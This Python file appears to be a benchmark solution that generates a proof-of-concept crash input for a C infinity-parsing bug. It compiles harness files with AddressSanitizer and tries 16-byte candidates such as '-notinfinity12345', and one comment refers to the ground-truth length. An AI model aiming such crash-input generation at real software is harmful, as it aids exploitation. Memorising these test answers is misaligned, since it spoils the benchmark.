import os
import tarfile
import tempfile
import subprocess
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable source file
            # Common patterns for vulnerable code
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc')):
                        filepath = os.path.join(root, file)
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                            # Look for patterns suggesting infinity parsing with minus sign
                            if ('-' in content and 'inf' in content.lower() and 
                                ('strncmp' in content or 'memcmp' in content or 
                                 'strcmp' in content or 'parse' in content.lower())):
                                # Try to compile and test potential PoCs
                                poc = self._test_potential_pocs(tmpdir, filepath)
                                if poc:
                                    return poc
            
            # Fallback: 16-byte pattern that commonly triggers such vulnerabilities
            # "-" followed by non-infinity characters to trigger the described bug
            return b"-notinfinity12345"

    def _test_potential_pocs(self, tmpdir: str, source_path: str) -> bytes:
        """Test potential PoCs by compiling and running with sanitizers."""
        
        # Try various patterns that match the vulnerability description
        test_patterns = [
            b"-notinfinity12345",  # 16 bytes: matches ground truth length
            b"-infinity\x00\x00\x00\x00\x00\x00",  # 16 bytes with nulls
            b"-INFINITY\x00\x00\x00\x00\x00\x00",  # 16 bytes uppercase
            b"-infinite\x00\x00\x00\x00\x00\x00\x00",  # 16 bytes
            b"-nan\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",  # 16 bytes
            b"-1.23e45\x00\x00\x00\x00\x00\x00\x00\x00",  # 16 bytes
            b"-not_a_number\x00\x00",  # 16 bytes
        ]
        
        # Find the main function or entry point
        build_dir = os.path.join(tmpdir, "build")
        os.makedirs(build_dir, exist_ok=True)
        
        # Look for a test harness or main file
        for root, dirs, files in os.walk(tmpdir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc')) and ('test' in file.lower() or 'main' in file.lower()):
                    main_file = os.path.join(root, file)
                    
                    # Try to compile with AddressSanitizer
                    exe_path = os.path.join(build_dir, "test_prog")
                    compile_cmd = [
                        "gcc", "-g", "-fsanitize=address", "-fno-omit-frame-pointer",
                        main_file, source_path, "-o", exe_path
                    ]
                    
                    try:
                        result = subprocess.run(compile_cmd, capture_output=True, timeout=30)
                        if result.returncode == 0:
                            # Test each pattern
                            for pattern in test_patterns:
                                if self._test_pattern(exe_path, pattern):
                                    return pattern
                    except:
                        continue
        
        return None

    def _test_pattern(self, exe_path: str, pattern: bytes) -> bool:
        """Test if pattern causes a crash with sanitizer."""
        try:
            # Run with timeout
            result = subprocess.run(
                [exe_path],
                input=pattern,
                capture_output=True,
                timeout=5
            )
            
            # Check for sanitizer error messages in stderr
            stderr = result.stderr.decode('utf-8', errors='ignore')
            if ('AddressSanitizer' in stderr or 
                'heap-buffer-overflow' in stderr or 
                'stack-buffer-overflow' in stderr or
                'SEGV' in stderr or 'Segmentation fault' in stderr):
                return True
        except subprocess.TimeoutExpired:
            pass
        except:
            pass
        
        return False